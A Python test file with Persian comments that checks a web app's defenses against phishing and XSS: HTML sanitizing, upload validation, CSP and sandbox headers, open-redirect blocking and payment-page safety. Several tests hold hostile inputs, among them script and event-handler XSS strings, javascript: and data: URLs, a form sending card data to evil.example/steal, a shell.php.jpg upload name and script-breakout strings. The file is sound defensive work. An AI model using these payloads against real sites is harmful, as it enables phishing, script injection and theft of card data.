# -*- coding: utf-8 -*-
"""تست‌های ضد «Dangerous site» (Google Safe Browsing / فیشینگ)

هر تست این فایل یک الگوی مشخص را می‌بندد که باعث می‌شود کروم دامنه را با پیام
«Attackers on the site you tried visiting might trick you into installing
software or revealing things like your passwords...» مسدود کند:

  1. میزبانی محتوای اجرایی (html/js/svg) زیر دامنهٔ ما
  2. XSS ذخیره‌شده از طریق HTML دلخواه صفحه‌ساز
  3. Open Redirect (لینک دامنهٔ ما که کاربر را به سایت مهاجم می‌برد)
  4. صفحهٔ شبیه‌ساز پرداخت که شبیه درگاه بانکی دیده شود / ایندکس شود
  5. هدرهای امنیتی گم‌شده (CSP و ...)
"""
import io

from conftest import login


# ─────────────────────────────────────────────────────────
# ۱) پاکسازی HTML — هستهٔ ضد XSS/فیشینگ
# ─────────────────────────────────────────────────────────
def test_sanitizer_strips_script_tag():
    from html_sanitizer import sanitize_html
    out = sanitize_html('<p>سلام</p><script>alert(1)</script>')
    assert '<script' not in out.lower()
    assert 'alert(1)' not in out
    assert 'سلام' in out


def test_sanitizer_strips_event_handlers():
    from html_sanitizer import sanitize_html
    out = sanitize_html('<img src="x.png" onerror="alert(1)">')
    assert 'onerror' not in out.lower()
    assert 'alert' not in out


def test_sanitizer_blocks_javascript_url():
    from html_sanitizer import sanitize_html
    out = sanitize_html('<a href="javascript:alert(1)">کلیک</a>')
    assert 'javascript:' not in out.lower()


def test_sanitizer_blocks_data_html_url():
    """data:text/html یک بردار شناخته‌شدهٔ فیشینگ است"""
    from html_sanitizer import sanitize_html
    out = sanitize_html('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')
    assert 'data:text/html' not in out.lower()


def test_sanitizer_removes_phishing_form_and_iframe():
    """فرم/آی‌فریم = صفحهٔ جعلی بانک داخل دامنهٔ ما → باید کامل حذف شود"""
    from html_sanitizer import sanitize_html
    payload = ('<form action="https://evil.example/steal"><input name="card">'
               '</form><iframe src="https://evil.example"></iframe>')
    out = sanitize_html(payload)
    assert '<form' not in out.lower()
    assert '<iframe' not in out.lower()
    assert 'evil.example' not in out


def test_sanitizer_adds_noopener_to_external_links():
    from html_sanitizer import sanitize_html
    out = sanitize_html('<a href="https://example.com" target="_blank">x</a>')
    assert 'noopener' in out and 'noreferrer' in out


def test_sanitizer_blocks_css_expression_and_remote_url():
    from html_sanitizer import sanitize_html
    out = sanitize_html('<div style="background:url(https://evil/x.png)">x</div>')
    assert 'evil' not in out
    out2 = sanitize_html('<div style="width:expression(alert(1))">x</div>')
    assert 'expression' not in out2.lower()


def test_sanitizer_keeps_content_after_dropped_tag():
    """رگرسیون: یک <input>/<form> نباید باعث دور ریختن بقیهٔ سند شود.

    اگر پاکسازی محتوای سالم را هم حذف کند، ادمین دوباره سراغ راه‌حل‌های
    ناامن می‌رود — پس «امن بودن» باید با «سالم ماندن محتوا» جمع شود.
    """
    from html_sanitizer import sanitize_html
    assert 'keep' in sanitize_html('<form><input name=x></form><p>keep</p>')
    assert 'keep' in sanitize_html('<p>a</p><input name=x><p>keep</p>')
    assert 'keep' in sanitize_html('<p>keep</p><textarea>x</textarea>')
    out = sanitize_html('<div><iframe src="//evil"></iframe><b>keep</b></div>')
    assert 'keep' in out and 'iframe' not in out


def test_sanitizer_keeps_safe_markup():
    """پاکسازی نباید محتوای سالم را خراب کند"""
    from html_sanitizer import sanitize_html
    out = sanitize_html('<p class="x"><b>مهم</b> <a href="/courses">دوره‌ها</a></p>')
    assert '<b>مهم</b>' in out
    assert 'href="/courses"' in out


# ─────────────────────────────────────────────────────────
# ۲) آپلود — جلوگیری از میزبانی محتوای اجرایی زیر دامنه
# ─────────────────────────────────────────────────────────
def test_double_extension_rejected():
    """shell.php.jpg نباید بپذیرد (دور زدن فیلتر پسوند)"""
    from validators import safe_filename
    assert safe_filename('shell.php.jpg') is None
    assert safe_filename('page.html.png') is None
    assert safe_filename('normal.jpg') == 'normal.jpg'


def test_svg_with_script_content_rejected():
    from validators import file_content_is_safe
    bad = io.BytesIO(b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
    assert file_content_is_safe(bad, '.svg') is False
    good = io.BytesIO(b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>')
    assert file_content_is_safe(good, '.svg') is True


def test_html_disguised_as_image_rejected():
    """فایل HTML با نام .png — اگر مرورگر آن را رندر کند = فیشینگ"""
    from validators import file_content_is_safe
    bad = io.BytesIO(b'<html><script>location="https://evil"</script></html>')
    assert file_content_is_safe(bad, '.png') is False


def test_media_upload_rejects_html_file(client):
    """کتابخانه رسانه نباید فایل html بپذیرد (میزبانی صفحهٔ فیشینگ)"""
    login(client, 't@test.ir', 'teacher123')
    r = client.post('/api/media/upload', data={
        'file': (io.BytesIO(b'<html>phishing</html>'), 'login.html')
    }, content_type='multipart/form-data')
    assert r.status_code == 400


def test_media_upload_rejects_zip(client):
    """zip قابل پخش به‌عنوان «دانلود نرم‌افزار» است — در کتابخانه رسانه مجاز نیست"""
    login(client, 't@test.ir', 'teacher123')
    r = client.post('/api/media/upload', data={
        'file': (io.BytesIO(b'PK\x03\x04'), 'setup.zip')
    }, content_type='multipart/form-data')
    assert r.status_code == 400


# ─────────────────────────────────────────────────────────
# ۳) هدرهای امنیتی
# ─────────────────────────────────────────────────────────
def test_csp_has_no_unsafe_eval(client):
    r = client.get('/')
    csp = r.headers.get('Content-Security-Policy', '')
    assert csp, 'هدر CSP وجود ندارد'
    assert "'unsafe-eval'" not in csp
    assert "object-src 'none'" in csp
    assert "frame-ancestors 'self'" in csp
    assert "form-action 'self'" in csp


def test_uploads_are_sandboxed(client):
    """پاسخ فایل‌های آپلودی باید nosniff + CSP سندباکس داشته باشد"""
    r = client.get('/static/uploads/media/nonexistent.png')
    # چه ۴۰۴ چه ۲۰۰ — هدرهای محافظ باید ست شده باشند
    assert r.headers.get('X-Content-Type-Options') == 'nosniff'
    assert 'sandbox' in r.headers.get('Content-Security-Policy', '')


def test_payment_pages_are_noindex(client):
    r = client.get('/cart')
    assert 'noindex' in r.headers.get('X-Robots-Tag', '')


# ─────────────────────────────────────────────────────────
# ۴) Open Redirect — لینک دامنهٔ ما نباید به سایت مهاجم برود
# ─────────────────────────────────────────────────────────
def test_login_next_rejects_external(client):
    r = client.get('/auth/login?next=https://evil.example/phish')
    assert 'evil.example' not in r.get_data(as_text=True)


def test_login_next_rejects_protocol_relative(client):
    """//evil.com هم یک URL مطلق است — باید رد شود"""
    from validators import safe_next
    assert safe_next('//evil.example') in (None, '', '/')
    assert safe_next('https://evil.example') in (None, '', '/')
    assert safe_next('/dashboard') == '/dashboard'


# ─────────────────────────────────────────────────────────
# ۵) شبیه‌ساز پرداخت
# ─────────────────────────────────────────────────────────
def test_sandbox_url_is_not_bank_like(client, app):
    """آدرس شبیه‌ساز نباید /pay/bank باشد (شبیه صفحهٔ جعلی بانک)"""
    rules = [str(r) for r in app.url_map.iter_rules()]
    assert not any('/pay/bank' in r for r in rules)
    assert any('/pay/sandbox' in r for r in rules)


def test_sandbox_page_has_no_card_fields():
    """صفحهٔ شبیه‌ساز هرگز نباید فیلد کارت/CVV2/رمز دوم داشته باشد"""
    with open('templates/pay/bank.html', encoding='utf-8') as f:
        html = f.read()
    for bad in ('name="card', 'name="cvv', 'name="pin', 'name="pin2'):
        assert bad not in html.lower()


def test_tracking_id_filter_blocks_injection(app):
    """شناسه GA/Clarity داخل <script> می‌رود — تزریق نباید ممکن باشد"""
    f = app.jinja_env.filters['tracking_id']
    assert f("G-ABC123") == 'G-ABC123'
    assert f("x';alert(1);//") == ''
    assert f('</script><script>alert(1)</script>') == ''
